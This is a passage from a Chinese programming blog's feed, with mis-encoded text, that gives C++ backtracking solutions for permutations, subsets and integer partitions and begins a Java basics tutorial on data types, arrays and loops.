punctuation">;</span><span class="token keyword">int</span> path<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ä¿å­˜åºåˆ—</span><span class="token keyword">int</span> state<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//æ•°å­—æ˜¯å¦è¢«ç”¨è¿‡</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>u <span class="token operator">&gt;</span> n<span class="token punctuation">)</span><span class="token comment">//æ•°å­—å¡«å®Œäº†ï¼Œè¾“å‡º</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment">//è¾“å‡ºæ–¹æ¡ˆ</span>            cout <span class="token operator">&lt;&lt;</span> path<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment">//ç©ºä½ä¸Šå¯ä»¥é€‰æ‹©çš„æ•°å­—ä¸º:1 ~ n</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>state<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">//å¦‚æœæ•°å­— i æ²¡æœ‰è¢«ç”¨è¿‡</span>        <span class="token punctuation">{</span>            path<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token comment">//æ”¾å…¥ç©ºä½</span>            state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//æ•°å­—è¢«ç”¨ï¼Œä¿®æ”¹çŠ¶æ€</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>u <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¡«ä¸‹ä¸€ä¸ªä½</span>            state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//å›æº¯ï¼Œå–å‡º i</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> n<span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç±»ä¼¼çš„é¢˜ï¼š</p><h3 id="é›†åˆçš„å­é›†"><a href="#é›†åˆçš„å­é›†" class="headerlink" title="é›†åˆçš„å­é›†"></a>é›†åˆçš„å­é›†</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> v<span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> curr<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span>      <span class="token comment">//curræœç´¢åˆ°æ•°ç»„çš„å“ªä¸€ä¸ªä½ç½®ï¼Œnè¡¨ç¤ºæ•°ç»„é•¿åº¦</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>curr<span class="token operator">==</span>n<span class="token punctuation">)</span><span class="token comment">//curr==nåˆ°å¤´äº†ï¼Œè¾“å‡º</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>v<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span>v<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>curr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//é€‰å½“å‰çš„æ•°ï¼Œå‹å…¥vector</span><span class="token function">dfs</span><span class="token punctuation">(</span>curr<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>v<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å›æº¯ï¼Œå–å‡ºä¸Šä¸€ä¸ªå‹è¿›å»çš„æ•°</span><span class="token function">dfs</span><span class="token punctuation">(</span>curr<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">&gt;&gt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ•°çš„åˆ’åˆ†"><a href="#æ•°çš„åˆ’åˆ†" class="headerlink" title="æ•°çš„åˆ’åˆ†"></a>æ•°çš„åˆ’åˆ†</h3><h4 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>å°†æ•´æ•° $n$ åˆ†æˆ $k$ ä»½ï¼Œä¸”æ¯ä»½ä¸èƒ½ä¸ºç©ºï¼Œä»»æ„ä¸¤ä¸ªæ–¹æ¡ˆä¸ç›¸åŒï¼ˆä¸è€ƒè™‘é¡ºåºï¼‰ã€‚ ä¾‹å¦‚ï¼š$n=7$ï¼Œ$k=3$ï¼Œä¸‹é¢ä¸‰ç§åˆ†æ³•è¢«è®¤ä¸ºæ˜¯ç›¸åŒçš„ã€‚ $1,1,5$; $1,5,1$; $5,1,1$. é—®æœ‰</p><p>å¤šå°‘ç§ä¸åŒçš„åˆ†æ³•ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-1"><a href="#è¾“å…¥æ ¼å¼-1" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>$n,k$ ï¼ˆ$6&lt;n \le 200$ï¼Œ$2 \le k \le 6$ï¼‰</p><h4 id="è¾“å‡ºæ ¼å¼-1"><a href="#è¾“å‡ºæ ¼å¼-1" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>$1$ ä¸ªæ•´æ•°ï¼Œå³ä¸åŒçš„åˆ†æ³•ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹"><a href="#è¾“å…¥æ ·ä¾‹" class="headerlink" title="è¾“å…¥æ ·ä¾‹"></a>è¾“å…¥æ ·ä¾‹</h4><pre class="line-numbers language-none"><code class="language-none">7 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹"><a href="#è¾“å‡ºæ ·ä¾‹" class="headerlink" title="è¾“å‡ºæ ·ä¾‹"></a>è¾“å‡ºæ ·ä¾‹</h4><pre class="line-numbers language-none"><code class="language-none">4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h4><p>å››ç§åˆ†æ³•ä¸ºï¼š $1,1,5$; $1,2,4$; $1,3,3$; $2,2,3$.</p><h4 id="é¢˜è§£ï¼š-1"><a href="#é¢˜è§£ï¼š-1" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>è¿™é“ç†å°±æ˜¯æš´åŠ›æœç´¢ï¼Œä¸ºäº†é˜²æ­¢æœ‰é‡å¤çš„ç­”æ¡ˆï¼Œæˆ‘ä»¬æŒ‰ç€ä»å°åˆ°å¤§çš„é¡ºåºè¿›è¡Œæœç´¢ã€‚ä» $1$ å¼€å§‹æœç´¢ï¼Œæ¯æ¬¡åŠ  $1$ ï¼Œæœåˆ° $k$ ä¸ªæ•°æ—¶ï¼Œåˆ¤æ–­æ˜¯å¦ç­‰äº $n$ ï¼Œæ˜¯ï¼Œåˆ™ç­”æ¡ˆ $+1$ ï¼Œç„¶åè¿”å›ã€‚</p><p>æˆ‘ä»¬ $i$ æ˜¯ä» $1$ å¼€å§‹ï¼Œåˆ°å“ªç»“æŸå‘¢ï¼Ÿä»¥åçš„æ•°ä¼šè¶Šæ¥è¶Šå¤§ï¼Œæ‰€ä»¥åªè¦æšä¸¾åˆ°<code>sum+i*(k-cur)&lt;=n</code>å°±å¯ä»¥äº†ï¼Œæ¯”<code>i&lt;=n</code>èŠ‚çº¦äº†ä¸å°‘æ—¶é—´å’Œç©ºé—´ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>k<span class="token punctuation">,</span>cnt<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> last<span class="token punctuation">,</span><span class="token keyword">int</span> sum<span class="token punctuation">,</span><span class="token keyword">int</span> cur<span class="token punctuation">)</span>    <span class="token comment">//lastè¡¨ç¤ºç°åœ¨æœåˆ°å“ªä¸ªæ•°ï¼Œsumæ˜¯æœåˆ°çš„æ•°ç›¸åŠ çš„å’Œï¼Œcuræ˜¯ç°åœ¨æœåˆ°æ•°çš„ä¸ªæ•°</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span>k<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sum<span class="token operator">==</span>n<span class="token punctuation">)</span> cnt<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>last<span class="token punctuation">;</span>sum<span class="token operator">+</span>i<span class="token operator">*</span><span class="token punctuation">(</span>k<span class="token operator">-</span>cur<span class="token punctuation">)</span><span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment">//å‰ªæï¼Œåªç”¨æšä¸¾åˆ°sum+i*(k-cur)&lt;=nä¸ºæ­¢</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>sum<span class="token operator">+</span>i<span class="token punctuation">,</span>cur<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>k<span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>cnt<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> é€’å½’ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaåŸºç¡€è¯­æ³•</title>
      <link href="/2022/03/28/java-ji-chu-yu-fa/"/>
      <url>/2022/03/28/java-ji-chu-yu-fa/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Javaè¯­è¨€ä¸­æ²¡æœ‰å…¨å±€å˜é‡çš„æ¦‚å¿µ</p><ul><li>ç”¨publicä¿®é¥°çš„staticæˆå‘˜å˜é‡å’Œæˆå‘˜æ–¹æ³•æœ¬è´¨æ˜¯å…¨å±€å˜é‡å’Œå…¨å±€æ–¹æ³•ï¼Œå½“å£°æ˜å®ƒç±»çš„å¯¹è±¡æ—¶ï¼Œä¸ç”Ÿæˆstaticå˜é‡çš„å‰¯æœ¬ï¼Œè€Œæ˜¯ç±»çš„æ‰€æœ‰å®ä¾‹å…±äº«åŒä¸€ä¸ªstaticå˜é‡ã€‚</li></ul></blockquote><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><img src="1639748785687.png" alt="1639748785687" style="zoom:80%;"><p>æ¯ç§åŸºæœ¬æ•°æ®ç±»å‹çš„å†…å­˜å ç”¨å’Œå–å€¼èŒƒå›´</p><p><img src="/2022/03/28/java-ji-chu-yu-fa/1639748866566.png" alt="1639748866566"></p><p>æ•´æ•°é»˜è®¤æ˜¯ï¼šintç±»å‹</p><p>æµ®ç‚¹æ•°é»˜è®¤æ˜¯ï¼šdoubleç±»å‹</p><p>è¿™æ ·å‘¢ï¼Œæˆ‘ä»¬å°±äº†è§£äº†Javaä¸­çš„ $8$ ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼Œä»¥åŠæ¯ç§æ•°æ®ç±»å‹å ç”¨å­—èŠ‚çš„æƒ…å†µå’Œå–å€¼èŒƒå›´ã€‚</p><h2 id="è¿ç®—ç¬¦-amp-é€‰æ‹©è¯­å¥"><a href="#è¿ç®—ç¬¦-amp-é€‰æ‹©è¯­å¥" class="headerlink" title="è¿ç®—ç¬¦&amp;é€‰æ‹©è¯­å¥"></a>è¿ç®—ç¬¦&amp;é€‰æ‹©è¯­å¥</h2><h4 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h4><p><strong>éšå¼è½¬æ¢ï¼š</strong>æŠŠä¸€ä¸ªè¡¨ç¤ºæ•°æ®èŒƒå›´å°çš„æ•°å€¼æˆ–è€…å˜é‡èµ‹å€¼ç»™å¦ä¸€ä¸ªè¡¨ç¤ºæ•°æ®èŒƒå›´å¤§çš„å˜é‡</p><p><strong>å¼ºåˆ¶è½¬æ¢ï¼š</strong>æŠŠä¸€ä¸ªè¡¨ç¤ºæ•°æ®èŒƒå›´å¤§çš„æ•°å€¼æˆ–è€…å˜é‡èµ‹å€¼ç»™å¦ä¸€ä¸ªè¡¨ç¤ºæ•°æ®èŒƒå›´å°çš„å˜é‡</p><blockquote><p>æ•°æ®ç±»å‹ å˜é‡å = (ç›®æ ‡æ•°æ®ç±»å‹)(æ•°å€¼æˆ–è€…å˜é‡)</p><p>æ‰©å±•çš„èµ‹å€¼è¿ç®—ç¬¦åŒ…å«äº†å¼ºåˆ¶ç±»å‹è½¬æ¢</p></blockquote><h2 id="Debugçš„åŸºæœ¬ä½¿ç”¨"><a href="#Debugçš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="Debugçš„åŸºæœ¬ä½¿ç”¨"></a>Debugçš„åŸºæœ¬ä½¿ç”¨</h2><ul><li>æ·»åŠ æ–­ç‚¹åï¼Œåœ¨ä»£ç åŒºåŸŸå³é”®Debugæ‰§è¡Œ</li></ul><p><img src="/2022/03/28/java-ji-chu-yu-fa/1639989693712.png"></p><ul><li><p>çœ‹Debuggerçª—å£ï¼Œçœ‹Consoleçª—å£</p><p><img src="/2022/03/28/java-ji-chu-yu-fa/1639989770511.png"></p></li><li><p>ç‚¹(Step Over F8) å¼€å§‹ï¼Œç‚¹(Stop)ç»“æŸ</p><p><img src="/2022/03/28/java-ji-chu-yu-fa/1639989859440-16484803426981.png"></p></li></ul><h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><p><strong>æ•°ç»„(array)ï¼š</strong>æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨<strong>å¤šä¸ªç›¸åŒæ•°æ®ç±»å‹</strong>çš„å­˜å‚¨æ¨¡å‹(å¯ä»¥ç†è§£ä¸ºå®¹å™¨)ã€‚</p><p><strong>æ ¼å¼1ï¼š</strong>æ•°æ®ç±»å‹[] å˜é‡å;</p><p><strong>æ ¼å¼2ï¼š</strong>æ•°æ®ç±»å‹ å˜é‡å[];</p><h4 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h4><p><strong>é™æ€åˆå§‹åŒ–ï¼š</strong>åˆå§‹åŒ–æ—¶æŒ‡å®šæ¯ä¸ªæ•°ç»„å…ƒç´ çš„åˆå§‹å€¼ï¼Œç”±ç³»ç»Ÿå†³å®šæ•°ç»„é•¿åº¦</p><p><strong>æ ¼å¼ï¼š</strong>æ•°æ®ç±»å‹[] å˜é‡å = new æ•°æ®ç±»å‹[]{æ•°æ®1,æ•°æ®2,æ•°æ®3,â€¦};</p><p><strong>ç®€åŒ–æ ¼å¼ï¼š</strong>æ•°æ®ç±»å‹[] å˜é‡å = {æ•°æ®1,æ•°æ®2,æ•°æ®3,â€¦};</p><p><strong>åŠ¨æ€åˆå§‹åŒ–ï¼š</strong>åˆå§‹åŒ–æ—¶åªæŒ‡å®šæ•°ç»„é•¿åº¦ï¼Œç”±ç³»ç»Ÿä¸ºæ•°ç»„åˆ†é…åˆå§‹å€¼</p><p><strong>æ ¼å¼ï¼š</strong>æ•°æ®ç±»å‹[] å˜é‡å = new æ•°æ®ç±»å‹[æ•°ç»„é•¿åº¦];</p><blockquote><p>æ•°ç»„ä½¿ç”¨ä¸­çš„ä¸¤ä¸ªå°é—®é¢˜</p><p>1ï¼šç´¢å¼•è¶Šç•Œï¼šè®¿é—®äº†æ•°ç»„ä¸­ä¸å­˜åœ¨çš„ç´¢å¼•å¯¹åº”çš„å…ƒç´ ï¼Œé€ æˆç´¢å¼•è¶Šç•Œé—®é¢˜</p><p>â€‹        ArrayIndexOutOfBoundsException</p><p>2ï¼šç©ºæŒ‡é’ˆå¼‚å¸¸ï¼šå¯¹è±¡è®¾ç½®ä¸ºnullä¸å†æŒ‡å‘å †å†…å­˜ï¼Œè¿˜æƒ³ç»§ç»­è®¿é—®æ•°æ®ï¼Œè®¿é—®å¤±è´¥</p><p>â€‹        NullPointerException</p></blockquote><h2 id="å¾ªç¯è¯­å¥"><a href="#å¾ªç¯è¯­å¥" class="headerlink" title="å¾ªç¯è¯­å¥"></a>å¾ªç¯è¯­å¥</h2><p>å’ŒC++å·®ä¸å¤š</p><p>çœ‹ä¸¤ä¸ªç®€å•çš„æ¡ˆä¾‹æ„Ÿå—ä¸€ä¸‹å³å¯</p><h4 id="é€¢ä¸ƒè¿‡-forè¯­å¥"><a href="#é€¢ä¸ƒè¿‡-forè¯­å¥" class="headerlink" title="é€¢ä¸ƒè¿‡(forè¯­å¥)"></a>é€¢ä¸ƒè¿‡(forè¯­å¥)</h4><p>ä»ä»»æ„ä¸€ä¸ªæ•°å­—å¼€å§‹æŠ¥æ•°ï¼Œå½“ä½ è¦æŠ¥çš„æ•°å­—åŒ…å« $7$ æˆ–è€…æ˜¯ $7$ çš„å€æ•°æ—¶éƒ½è¦è¯´ï¼šè¿‡ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ForTest07</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//1:è·å–1-100ä¹‹é—´çš„æ•°æ®ï¼Œé€šè¿‡å¾ªç¯å®ç°</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">//2:åˆ¤æ–­æ•°å­—åŒ…å«7æˆ–è€…æ˜¯7çš„å€æ•°(åˆ¤æ–­æ•°æ®ï¼šè¦ä¹ˆä¸ªä½æ˜¯7ï¼Œè¦ä¹ˆåä½æ˜¯7ï¼Œè¦ä¹ˆèƒ½å¤Ÿè¢«7æ•´é™¤)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">7</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">//3:åœ¨æ§åˆ¶å°è¾“å‡ºæ»¡è¶³æ¡ä»¶çš„æ•°æ®</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æŠ˜çº¸ï¼ˆwhileè¯­å¥ï¼‰"><a href="#æŠ˜çº¸ï¼ˆwhileè¯­å¥ï¼‰" class="headerlink" title="æŠ˜çº¸ï¼ˆwhileè¯­å¥ï¼‰"></a>æŠ˜çº¸ï¼ˆwhileè¯­å¥ï¼‰</h4><p>ä¸–ç•Œæœ€é«˜å³°ç ç©†æœ—ç›å³°(8848.86m)ï¼Œæˆ‘ç°åœ¨æœ‰ä¸€å¼ è¶³å¤Ÿå¤§çš„çº¸å¼ ï¼Œåšåº¦ä¸ºï¼š0.001mã€‚è¯·é—®ï¼Œæˆ‘æŠ˜å å¤šå°‘æ¬¡ï¼Œå°±å¯ä»¥ä¿è¯åšåº¦ä¸ä½äºç ç©†æœ—ç›å³°çš„é«˜åº¦?</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WhileTest02</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//1:å®šä¹‰ç»Ÿè®¡å˜é‡ï¼Œåˆå§‹åŒ–å€¼ä¸º0</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment">//2:å®šä¹‰çº¸å¼ åšåº¦å˜é‡å’Œç å³°é«˜åº¦å˜é‡</span>        <span class="token keyword">double</span> paper <span class="token operator">=</span> <span class="token number">0.001</span><span class="token punctuation">;</span>        <span class="token keyword">double</span> zf <span class="token operator">=</span> <span class="token number">8848.86</span><span class="token punctuation">;</span>        <span class="token comment">//3:ç”¨whileå¾ªç¯å®ç°åå¤æŠ˜å ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯çº¸å¼ åšåº¦å°äºç å³°é«˜åº¦</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>paper <span class="token operator">&lt;</span> zf<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">//4:å¾ªç¯ä½“ä¸­è¦åšä¸¤ä»¶äº‹æƒ…ï¼šä¸€æ˜¯çº¸å¼ åšåº¦åŠ å€ï¼ŒäºŒæ˜¯ç»Ÿè®¡å˜é‡+1</span>            paper <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>            count<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">//5:å½“å¾ªç¯ç»“æŸï¼Œè¾“å‡ºç»Ÿè®¡å˜é‡çš„å€¼</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¦æŠ˜å "</span> <span class="token operator">+</span> count <span class="token operator">+</span> <span class="token string">"æ¬¡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>forå¾ªç¯å’Œwhileå¾ªç¯<strong>å…ˆåˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹</strong>ï¼Œç„¶åå†³å®šæ˜¯å¦æ‰§è¡Œå¾ªç¯ä½“ï¼ˆå…ˆåˆ¤æ–­åæ‰§è¡Œï¼‰</p><p>doâ€¦whileå¾ªç¯<strong>å…ˆæ‰§è¡Œä¸€æ¬¡å¾ªç¯ä½“</strong>ï¼Œç„¶ååˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œæ˜¯å¦ç»§ç»­æ‰§è¡Œå¾ªç¯ä½“ï¼ˆå…ˆæ‰§è¡Œååˆ¤æ–­ï¼‰</p><h4 id="è·³è½¬å…³é”®å­—"><a href="#è·³è½¬å…³é”®å­—" class="headerlink" title="è·³è½¬å…³é”®å­—"></a>è·³è½¬å…³é”®å­—</h4><blockquote><ul><li><strong>continue</strong>      ç”¨åœ¨å¾ªç¯ä¸­ï¼ŒåŸºäºæ¡ä»¶æ§åˆ¶ï¼Œè·³è¿‡æŸæ¬¡å¾ªç¯ä½“å†…å®¹çš„æ‰§è¡Œï¼Œç»§ç»­ä¸‹ä¸€æ¬¡çš„æ‰§è¡Œ</li><li><strong>break</strong>               